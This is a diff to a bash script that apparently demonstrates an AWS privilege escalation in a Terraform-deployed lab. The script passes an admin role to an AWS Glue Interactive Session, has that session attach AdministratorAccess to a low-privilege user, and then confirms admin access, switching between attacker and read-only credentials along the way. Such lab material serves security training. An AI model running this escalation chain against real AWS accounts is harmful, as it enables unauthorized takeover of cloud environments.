@@ -70,6 +70,15 @@ if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; 
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 if [ -z "$AWS_REGION" ]; then
     echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
@@ -78,22 +87,32 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
-echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Verify starting user identity
+echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
-# Verify starting user identity
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
@@ -104,15 +123,17 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
-# Step 3: Get account ID
+# [OBSERVATION] Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
+use_readonly_creds
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify lack of admin permissions
+# [EXPLOIT] Step 4: Verify lack of admin permissions
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
+use_starting_creds
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -122,8 +143,9 @@ else
 fi
 echo ""
 
-# Step 5: Create Glue Interactive Session with admin role
+# [EXPLOIT] Step 5: Create Glue Interactive Session with admin role
 echo -e "${YELLOW}Step 5: Creating Glue Interactive Session with admin role${NC}"
+use_starting_creds
 echo "This is the privilege escalation vector - passing the admin role to Glue..."
 ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
 echo "Admin Role ARN: $ADMIN_ROLE_ARN"
@@ -152,15 +174,16 @@ else
 fi
 echo ""
 
-# Step 6: Wait for session to be ready
+# [OBSERVATION] Step 6: Wait for session to be ready
 echo -e "${YELLOW}Step 6: Waiting for Glue Interactive Session to be ready${NC}"
+use_readonly_creds
 echo "Monitoring session status (checking every 10 seconds)..."
 
 MAX_WAIT=300  # 5 minutes
 ELAPSED=0
 
 while [ $ELAPSED -lt $MAX_WAIT ]; do
-    show_cmd "Attacker" "aws glue get-session --region \"$AWS_REGION\" --id \"$SESSION_ID\" --query 'Session.Status' --output text"
+    show_cmd "ReadOnly" "aws glue get-session --region \"$AWS_REGION\" --id \"$SESSION_ID\" --query 'Session.Status' --output text"
     SESSION_STATUS=$(aws glue get-session \
         --region "$AWS_REGION" \
         --id "$SESSION_ID" \
@@ -192,8 +215,9 @@ if [ $ELAPSED -ge $MAX_WAIT ]; then
     exit 1
 fi
 
-# Step 7: Run statement to attach AdministratorAccess to starting user
+# [EXPLOIT] Step 7: Run statement to attach AdministratorAccess to starting user
 echo -e "${YELLOW}Step 7: Running statement to attach AdministratorAccess to starting user${NC}"
+use_starting_creds
 echo "Using boto3 within the Glue session to attach admin policy..."
 
 # Create the Python code to execute
@@ -226,15 +250,16 @@ fi
 echo "Statement ID: $STATEMENT_ID"
 echo -e "${GREEN}✓ Statement submitted successfully${NC}\n"
 
-# Step 8: Wait for statement to complete
+# [OBSERVATION] Step 8: Wait for statement to complete
 echo -e "${YELLOW}Step 8: Waiting for statement to complete${NC}"
+use_readonly_creds
 echo "Monitoring statement status..."
 
 MAX_WAIT=120  # 2 minutes
 ELAPSED=0
 
 while [ $ELAPSED -lt $MAX_WAIT ]; do
-    show_cmd "Attacker" "aws glue get-statement --region \"$AWS_REGION\" --session-id \"$SESSION_ID\" --id \"$STATEMENT_ID\" --query 'Statement.State' --output text"
+    show_cmd "ReadOnly" "aws glue get-statement --region \"$AWS_REGION\" --session-id \"$SESSION_ID\" --id \"$STATEMENT_ID\" --query 'Statement.State' --output text"
     STATEMENT_STATUS=$(aws glue get-statement \
         --region "$AWS_REGION" \
         --session-id "$SESSION_ID" \
@@ -287,11 +312,12 @@ echo "IAM changes can take up to 15 seconds to be effective..."
 sleep 15
 echo -e "${GREEN}✓ Policy propagation complete${NC}\n"
 
-# Step 10: Verify admin access
+# [OBSERVATION] Step 10: Verify admin access
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
+use_readonly_creds
 echo "Attempting to list IAM users..."
 
-show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
